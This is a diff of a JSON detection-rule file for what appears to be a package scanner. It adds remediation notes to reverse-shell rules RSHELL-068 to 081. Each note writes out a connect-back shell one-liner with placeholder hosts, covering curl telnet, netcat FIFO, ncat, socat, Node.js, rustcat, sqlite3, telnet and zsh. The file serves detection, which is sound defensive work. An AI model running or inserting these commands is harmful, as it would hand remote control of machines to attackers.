       "id": "RSHELL-068",
@@ -890,7 +1091,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "curl reverse shell: `C='curl -Ns telnet://<host>:<port>'` tunnels a shell's stdin/stdout through curl's telnet transport, emulating netcat. Using curl as a shell transport to a hard-coded host is malicious — treat the match as such and reject the code.",
+      "references": ["MITRE T1059.004"],
+      "tags": ["reverse-shell", "curl", "telnet"]
     },
     {
       "id": "RSHELL-069",
@@ -903,7 +1107,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "netcat FIFO reverse shell: `mkfifo /tmp/f; cat /tmp/f | <shell> -i 2>&1 | nc <host> <port> >/tmp/f` connects back and serves an interactive shell through a named pipe. This has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059.004"],
+      "tags": ["reverse-shell", "netcat", "mkfifo"]
     },
     {
       "id": "RSHELL-070",
@@ -916,7 +1123,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "Windows netcat reverse shell: `nc.exe <host> <port> -e <shell>` connects back and hands the shell to the listener. The `-e` exec-on-connect flag has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059"],
+      "tags": ["reverse-shell", "netcat", "windows"]
     },
     {
       "id": "RSHELL-071",
@@ -929,7 +1139,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "ncat reverse shell: `ncat <host> <port> -e <shell>` connects back and executes the shell over the connection. The `-e` exec-on-connect flag has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059"],
+      "tags": ["reverse-shell", "ncat"]
     },
     {
       "id": "RSHELL-072",
@@ -942,7 +1155,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "ncat reverse shell (UDP): a `mkfifo` pipe bridges an interactive shell to `ncat -u <host> <port>`, connecting back over UDP. This has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059.004"],
+      "tags": ["reverse-shell", "ncat", "mkfifo"]
     },
     {
       "id": "RSHELL-073",
@@ -955,7 +1171,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "Windows ncat reverse shell: `ncat.exe <host> <port> -e <shell>` connects back and executes the shell over the connection. The `-e` exec-on-connect flag has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059"],
+      "tags": ["reverse-shell", "ncat", "windows"]
     },
     {
       "id": "RSHELL-074",
@@ -968,7 +1187,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "Node.js reverse shell: `require('child_process').exec('nc -e <shell> <host> <port>')` shells out to a netcat connect-back. Embedding a reverse-shell spawn in a package is malicious — treat the match as such and reject the code.",
+      "references": ["MITRE T1059.007"],
+      "tags": ["reverse-shell", "node", "netcat"]
     },
     {
       "id": "RSHELL-075",
@@ -981,7 +1203,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "Node.js reverse shell: a `net.Socket` connects to a hard-coded host/port and a `child_process.spawn` shell is bridged to it, with a `return /a/` guard to keep the process alive. This connect-back shell has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059.007"],
+      "tags": ["reverse-shell", "node"]
     },
     {
       "id": "RSHELL-076",
@@ -994,7 +1219,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "rustcat reverse shell: `rcat connect -s <shell> <host> <port>` connects back and serves the given shell. Invoking rustcat's connect-with-shell mode toward a hard-coded host is malicious — treat the match as such and reject the code.",
+      "references": ["MITRE T1059"],
+      "tags": ["reverse-shell", "rustcat"]
     },
     {
       "id": "RSHELL-077",
@@ -1007,7 +1235,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "socat reverse shell: `socat TCP:<host>:<port> EXEC:<shell>` connects back and executes the shell over the connection. socat is a legitimate relay, but `TCP:` connect piped to `EXEC:` a shell is a reverse shell — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059.004"],
+      "tags": ["reverse-shell", "socat"]
     },
     {
       "id": "RSHELL-078",
@@ -1020,7 +1251,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "socat reverse shell (PTY): `socat TCP:<host>:<port> EXEC:'<shell>',pty,stderr,setsid,sigint,sane` connects back and serves a full interactive PTY shell. This has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059.004"],
+      "tags": ["reverse-shell", "socat"]
     },
     {
       "id": "RSHELL-079",
@@ -1033,7 +1267,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "SQLite reverse shell (LOLBin): `sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;...|nc <host> <port>...'` abuses the `.shell` dot-command to launch a netcat connect-back. No package drives sqlite3 to spawn a shell — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059.004"],
+      "tags": ["reverse-shell", "sqlite", "netcat", "lolbin"]
     },
     {
       "id": "RSHELL-080",
@@ -1046,7 +1283,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "telnet reverse shell: a `mktemp` FIFO bridges `telnet <host> <port>` to a shell (`0<$TF | <shell> 1>$TF`), emulating netcat over telnet. This connect-back shell has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059.004"],
+      "tags": ["reverse-shell", "telnet", "mkfifo"]
     },
     {
       "id": "RSHELL-081",
@@ -1059,7 +1299,10 @@
         "line_contains": [
           "sigil-reviewed-revshell"
         ]
-      }
+      },
+      "remediation": "Zsh reverse shell: `zsh -c 'zmodload zsh/net/tcp && ztcp <host> <port> && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'` uses the zsh/net/tcp module to connect back and redirect an interactive zsh onto the socket. This has no legitimate packaging use — treat the match as malicious and reject the code.",
+      "references": ["MITRE T1059.004"],
+      "tags": ["reverse-shell", "zsh"]
     }
   ],
   "provenance_rules": []
